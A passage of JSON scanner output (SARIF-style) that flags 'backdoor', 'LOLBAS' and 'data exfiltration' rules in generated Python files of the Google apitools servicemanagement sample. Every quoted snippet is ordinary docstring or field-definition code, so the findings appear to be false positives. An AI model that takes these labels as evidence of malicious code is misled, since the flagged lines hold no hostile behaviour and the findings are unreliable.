          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 15,
                  "endLine": 143,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n    def Create(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service. This method.\nonly stores the service config, but does not apply the service config to\nany backend services.\n\n      Args:\n",
                    "rendered": {
                      "text": "\n    def Create(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service. This method.\nonly stores the service config, but does not apply the service config to\nany backend services.\n\n      Args:\n",
                      "markdown": "`\n    def Create(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service. This method.\nonly stores the service config, but does not apply the service config to\nany backend services.\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 142,
                  "startColumn": 23,
                  "endLine": 142,
                  "endColumn": 32,
                  "snippet": {
                    "text": "          }\n\n    def Create(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service. This method.\nonly stores the service config, but does not apply the service config to\nany backend services.\n\n",
                    "rendered": {
                      "text": "          }\n\n    def Create(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service. This method.\nonly stores the service config, but does not apply the service config to\nany backend services.\n\n",
                      "markdown": "`          }\n\n    def Create(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service. This method.\nonly stores the service config, but does not apply the service config to\nany backend services.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 99,
                  "startColumn": 48,
                  "endLine": 99,
                  "endColumn": 57,
                  "snippet": {
                    "text": "          }\n\n    def Query(self, request, global_params=None):\n      r\"\"\"Method to query the accessibility of a service and any associated.\nvisibility labels for a specified user.\n\nMembers of the producer project may call this method and specify any user.\n",
                    "rendered": {
                      "text": "          }\n\n    def Query(self, request, global_params=None):\n      r\"\"\"Method to query the accessibility of a service and any associated.\nvisibility labels for a specified user.\n\nMembers of the producer project may call this method and specify any user.\n",
                      "markdown": "`          }\n\n    def Query(self, request, global_params=None):\n      r\"\"\"Method to query the accessibility of a service and any associated.\nvisibility labels for a specified user.\n\nMembers of the producer project may call this method and specify any user.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 33,
                  "endLine": 11,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n\nclass ServicemanagementV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service servicemanagement version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://servicemanagement.googleapis.com/'\n",
                    "rendered": {
                      "text": "\n\nclass ServicemanagementV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service servicemanagement version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://servicemanagement.googleapis.com/'\n",
                      "markdown": "`\n\nclass ServicemanagementV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service servicemanagement version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://servicemanagement.googleapis.com/'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3034,
                  "startColumn": 3,
                  "endLine": 3034,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  callback = _messages.StringField(5)\n  fields = _messages.StringField(6)\n  key = _messages.StringField(7)\n  oauth_token = _messages.StringField(8)\n  pp = _messages.BooleanField(9, default=True)\n  prettyPrint = _messages.BooleanField(10, default=True)\n  quotaUser = _messages.StringField(11)\n",
                    "rendered": {
                      "text": "  callback = _messages.StringField(5)\n  fields = _messages.StringField(6)\n  key = _messages.StringField(7)\n  oauth_token = _messages.StringField(8)\n  pp = _messages.BooleanField(9, default=True)\n  prettyPrint = _messages.BooleanField(10, default=True)\n  quotaUser = _messages.StringField(11)\n",
                      "markdown": "`  callback = _messages.StringField(5)\n  fields = _messages.StringField(6)\n  key = _messages.StringField(7)\n  oauth_token = _messages.StringField(8)\n  pp = _messages.BooleanField(9, default=True)\n  prettyPrint = _messages.BooleanField(10, default=True)\n  quotaUser = _messages.StringField(11)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2993,
                  "startColumn": 5,
                  "endLine": 2993,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    pp: Pretty-print response.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n",
                    "rendered": {
                      "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    pp: Pretty-print response.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n",
                      "markdown": "`    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    pp: Pretty-print response.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3065,
                  "startColumn": 2,
                  "endLine": 3065,
                  "endColumn": 53,
                  "snippet": {
                    "text": "  some error codes in C.  # Other uses  The error model and the `Status`\n  message can be used in a variety of environments, either with or without\n  APIs, to provide a consistent developer experience across different\n  environments.  Example uses of this error model include:  - Partial errors.\n  If a service needs to return partial errors to the client,     it may embed\n  the `Status` in the normal response to indicate the partial     errors.  -\n  Workflow errors. A typical workflow has multiple steps. Each step may\n",
                    "rendered": {
                      "text": "  some error codes in C.  # Other uses  The error model and the `Status`\n  message can be used in a variety of environments, either with or without\n  APIs, to provide a consistent developer experience across different\n  environments.  Example uses of this error model include:  - Partial errors.\n  If a service needs to return partial errors to the client,     it may embed\n  the `Status` in the normal response to indicate the partial     errors.  -\n  Workflow errors. A typical workflow has multiple steps. Each step may\n",
                      "markdown": "`  some error codes in C.  # Other uses  The error model and the `Status`\n  message can be used in a variety of environments, either with or without\n  APIs, to provide a consistent developer experience across different\n  environments.  Example uses of this error model include:  - Partial errors.\n  If a service needs to return partial errors to the client,     it may embed\n  the `Status` in the normal response to indicate the partial     errors.  -\n  Workflow errors. A typical workflow has multiple steps. Each step may\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3045,
                  "startColumn": 24,
                  "endLine": 3045,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\nclass Status(_messages.Message):\n  r\"\"\"The `Status` type defines a logical error model that is suitable for\n  different programming environments, including REST APIs and RPC APIs. It is\n  used by [gRPC](https://github.com/grpc). The error model is designed to be:\n  - Simple to use and understand for most users - Flexible enough to meet\n  unexpected needs  # Overview  The `Status` message contains three pieces of\n",
                    "rendered": {
                      "text": "\nclass Status(_messages.Message):\n  r\"\"\"The `Status` type defines a logical error model that is suitable for\n  different programming environments, including REST APIs and RPC APIs. It is\n  used by [gRPC](https://github.com/grpc). The error model is designed to be:\n  - Simple to use and understand for most users - Flexible enough to meet\n  unexpected needs  # Overview  The `Status` message contains three pieces of\n",
                      "markdown": "`\nclass Status(_messages.Message):\n  r\"\"\"The `Status` type defines a logical error model that is suitable for\n  different programming environments, including REST APIs and RPC APIs. It is\n  used by [gRPC](https://github.com/grpc). The error model is designed to be:\n  - Simple to use and understand for most users - Flexible enough to meet\n  unexpected needs  # Overview  The `Status` message contains three pieces of\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3496,
                  "startColumn": 36,
                  "endLine": 3496,
                  "endColumn": 45,
                  "snippet": {
                    "text": "      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n  \"\"\"\n\n",
                      "markdown": "`      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3494,
                  "startColumn": 64,
                  "endLine": 3495,
                  "snippet": {
                    "text": "      what API surface is visible to calls made by this project. The visible\n      surface is a union of the surface features associated with each label\n      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n  \"\"\"\n",
                    "rendered": {
                      "text": "      what API surface is visible to calls made by this project. The visible\n      surface is a union of the surface features associated with each label\n      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n  \"\"\"\n",
                      "markdown": "`      what API surface is visible to calls made by this project. The visible\n      surface is a union of the surface features associated with each label\n      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3494,
                  "startColumn": 5,
                  "endLine": 3494,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      what API surface is visible to calls made by this project. The visible\n      surface is a union of the surface features associated with each label\n      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n",
                    "rendered": {
                      "text": "      what API surface is visible to calls made by this project. The visible\n      surface is a union of the surface features associated with each label\n      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n",
                      "markdown": "`      what API surface is visible to calls made by this project. The visible\n      surface is a union of the surface features associated with each label\n      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3486,
                  "startColumn": 49,
                  "endLine": 3486,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\n\nclass VisibilitySettings(_messages.Message):\n  r\"\"\"Settings that control which features of the service are visible to the\n  consumer project.\n\n  Fields:\n",
                    "rendered": {
                      "text": "\n\nclass VisibilitySettings(_messages.Message):\n  r\"\"\"Settings that control which features of the service are visible to the\n  consumer project.\n\n  Fields:\n",
                      "markdown": "`\n\nclass VisibilitySettings(_messages.Message):\n  r\"\"\"Settings that control which features of the service are visible to the\n  consumer project.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3443,
                  "startColumn": 68,
                  "endLine": 3444,
                  "snippet": {
                    "text": "    enforceRuntimeVisibility: Controls whether visibility rules are enforced\n      at runtime for requests to all APIs and methods.  If true, requests\n      without method visibility will receive a NOT_FOUND error, and any non-\n      visible fields will be scrubbed from the response messages. In service\n      config version 0, the default is false. In later config versions, it's\n      true.  Note, the `enforce_runtime_visibility` specified in a visibility\n      rule overrides this setting for the APIs or methods asscoiated with the\n      rule.\n",
                    "rendered": {
                      "text": "    enforceRuntimeVisibility: Controls whether visibility rules are enforced\n      at runtime for requests to all APIs and methods.  If true, requests\n      without method visibility will receive a NOT_FOUND error, and any non-\n      visible fields will be scrubbed from the response messages. In service\n      config version 0, the default is false. In later config versions, it's\n      true.  Note, the `enforce_runtime_visibility` specified in a visibility\n      rule overrides this setting for the APIs or methods asscoiated with the\n      rule.\n",
                      "markdown": "`    enforceRuntimeVisibility: Controls whether visibility rules are enforced\n      at runtime for requests to all APIs and methods.  If true, requests\n      without method visibility will receive a NOT_FOUND error, and any non-\n      visible fields will be scrubbed from the response messages. In service\n      config version 0, the default is false. In later config versions, it's\n      true.  Note, the `enforce_runtime_visibility` specified in a visibility\n      rule overrides this setting for the APIs or methods asscoiated with the\n      rule.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3426,
                  "startColumn": 61,
                  "endLine": 3427,
                  "snippet": {
                    "text": "\n\nclass Visibility(_messages.Message):\n  r\"\"\"`Visibility` defines restrictions for the visibility of service\n  elements.  Restrictions are specified using visibility labels (e.g.,\n  TRUSTED_TESTER) that are elsewhere linked to users and projects.  Users and\n  projects can have access to more than one visibility label. The effective\n  visibility for multiple labels is the union of each label's elements, plus\n",
                    "rendered": {
                      "text": "\n\nclass Visibility(_messages.Message):\n  r\"\"\"`Visibility` defines restrictions for the visibility of service\n  elements.  Restrictions are specified using visibility labels (e.g.,\n  TRUSTED_TESTER) that are elsewhere linked to users and projects.  Users and\n  projects can have access to more than one visibility label. The effective\n  visibility for multiple labels is the union of each label's elements, plus\n",
                      "markdown": "`\n\nclass Visibility(_messages.Message):\n  r\"\"\"`Visibility` defines restrictions for the visibility of service\n  elements.  Restrictions are specified using visibility labels (e.g.,\n  TRUSTED_TESTER) that are elsewhere linked to users and projects.  Users and\n  projects can have access to more than one visibility label. The effective\n  visibility for multiple labels is the union of each label's elements, plus\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3408,
                  "startColumn": 64,
                  "endLine": 3409,
                  "snippet": {
                    "text": "      quota (inclusive). This must be no more than 5 years after start_date.\n      YYYYMMdd date format, e.g. 20140730.\n    groupName: The quota group that has the variable term quota applied to it.\n      This must be a google.api.QuotaGroup.name specified in the service\n      configuration.\n    limit: The number of tokens available during the configured term.\n    quotaUsage: The usage data of this quota.\n    startDate: The beginning of the active period for the variable term quota.\n",
                    "rendered": {
                      "text": "      quota (inclusive). This must be no more than 5 years after start_date.\n      YYYYMMdd date format, e.g. 20140730.\n    groupName: The quota group that has the variable term quota applied to it.\n      This must be a google.api.QuotaGroup.name specified in the service\n      configuration.\n    limit: The number of tokens available during the configured term.\n    quotaUsage: The usage data of this quota.\n    startDate: The beginning of the active period for the variable term quota.\n",
                      "markdown": "`      quota (inclusive). This must be no more than 5 years after start_date.\n      YYYYMMdd date format, e.g. 20140730.\n    groupName: The quota group that has the variable term quota applied to it.\n      This must be a google.api.QuotaGroup.name specified in the service\n      configuration.\n    limit: The number of tokens available during the configured term.\n    quotaUsage: The usage data of this quota.\n    startDate: The beginning of the active period for the variable term quota.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3398,
                  "startColumn": 15,
                  "endLine": 3398,
                  "endColumn": 21,
                  "snippet": {
                    "text": "  America/Los_Angeles time zone.\n\n  Fields:\n    createTime: Time when this variable term quota was created. If multiple\n      quotas are simultaneously active, then the quota with the latest\n      create_time is the effective one.\n    displayEndDate: The displayed end of the active period for the variable\n",
                    "rendered": {
                      "text": "  America/Los_Angeles time zone.\n\n  Fields:\n    createTime: Time when this variable term quota was created. If multiple\n      quotas are simultaneously active, then the quota with the latest\n      create_time is the effective one.\n    displayEndDate: The displayed end of the active period for the variable\n",
                      "markdown": "`  America/Los_Angeles time zone.\n\n  Fields:\n    createTime: Time when this variable term quota was created. If multiple\n      quotas are simultaneously active, then the quota with the latest\n      create_time is the effective one.\n    displayEndDate: The displayed end of the active period for the variable\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3395,
                  "startColumn": 21,
                  "endLine": 3395,
                  "endColumn": 27,
                  "snippet": {
                    "text": "  specified (usually long) time period. When present, it overrides any \"1d\"\n  duration per-project quota specified on the group.  Variable terms run from\n  midnight to midnight, start_date to end_date (inclusive) in the\n  America/Los_Angeles time zone.\n\n  Fields:\n    createTime: Time when this variable term quota was created. If multiple\n",
                    "rendered": {
                      "text": "  specified (usually long) time period. When present, it overrides any \"1d\"\n  duration per-project quota specified on the group.  Variable terms run from\n  midnight to midnight, start_date to end_date (inclusive) in the\n  America/Los_Angeles time zone.\n\n  Fields:\n    createTime: Time when this variable term quota was created. If multiple\n",
                      "markdown": "`  specified (usually long) time period. When present, it overrides any \"1d\"\n  duration per-project quota specified on the group.  Variable terms run from\n  midnight to midnight, start_date to end_date (inclusive) in the\n  America/Los_Angeles time zone.\n\n  Fields:\n    createTime: Time when this variable term quota was created. If multiple\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3392,
                  "startColumn": 26,
                  "endLine": 3392,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\nclass VariableTermQuota(_messages.Message):\n  r\"\"\"A variable term quota is a bucket of tokens that is consumed over a\n  specified (usually long) time period. When present, it overrides any \"1d\"\n  duration per-project quota specified on the group.  Variable terms run from\n  midnight to midnight, start_date to end_date (inclusive) in the\n  America/Los_Angeles time zone.\n",
                    "rendered": {
                      "text": "\nclass VariableTermQuota(_messages.Message):\n  r\"\"\"A variable term quota is a bucket of tokens that is consumed over a\n  specified (usually long) time period. When present, it overrides any \"1d\"\n  duration per-project quota specified on the group.  Variable terms run from\n  midnight to midnight, start_date to end_date (inclusive) in the\n  America/Los_Angeles time zone.\n",
                      "markdown": "`\nclass VariableTermQuota(_messages.Message):\n  r\"\"\"A variable term quota is a bucket of tokens that is consumed over a\n  specified (usually long) time period. When present, it overrides any \"1d\"\n  duration per-project quota specified on the group.  Variable terms run from\n  midnight to midnight, start_date to end_date (inclusive) in the\n  America/Los_Angeles time zone.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3382,
                  "startColumn": 18,
                  "endLine": 3382,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n    Values:\n      DISABLED: The service is disabled.\n      ENABLED: The service is enabled.\n    \"\"\"\n    DISABLED = 0\n    ENABLED = 1\n",
                    "rendered": {
                      "text": "\n    Values:\n      DISABLED: The service is disabled.\n      ENABLED: The service is enabled.\n    \"\"\"\n    DISABLED = 0\n    ENABLED = 1\n",
                      "markdown": "`\n    Values:\n      DISABLED: The service is disabled.\n      ENABLED: The service is enabled.\n    \"\"\"\n    DISABLED = 0\n    ENABLED = 1\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3381,
                  "startColumn": 19,
                  "endLine": 3381,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    service configuration.\n\n    Values:\n      DISABLED: The service is disabled.\n      ENABLED: The service is enabled.\n    \"\"\"\n    DISABLED = 0\n",
                    "rendered": {
                      "text": "    service configuration.\n\n    Values:\n      DISABLED: The service is disabled.\n      ENABLED: The service is enabled.\n    \"\"\"\n    DISABLED = 0\n",
                      "markdown": "`    service configuration.\n\n    Values:\n      DISABLED: The service is disabled.\n      ENABLED: The service is enabled.\n    \"\"\"\n    DISABLED = 0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3378,
                  "startColumn": 3,
                  "endLine": 3378,
                  "endColumn": 12,
                  "snippet": {
                    "text": "  class ConsumerEnableStatusValueValuesEnum(_messages.Enum):\n    r\"\"\"Consumer controlled setting to enable/disable use of this service by\n    the consumer project. The default value of this is controlled by the\n    service configuration.\n\n    Values:\n      DISABLED: The service is disabled.\n",
                    "rendered": {
                      "text": "  class ConsumerEnableStatusValueValuesEnum(_messages.Enum):\n    r\"\"\"Consumer controlled setting to enable/disable use of this service by\n    the consumer project. The default value of this is controlled by the\n    service configuration.\n\n    Values:\n      DISABLED: The service is disabled.\n",
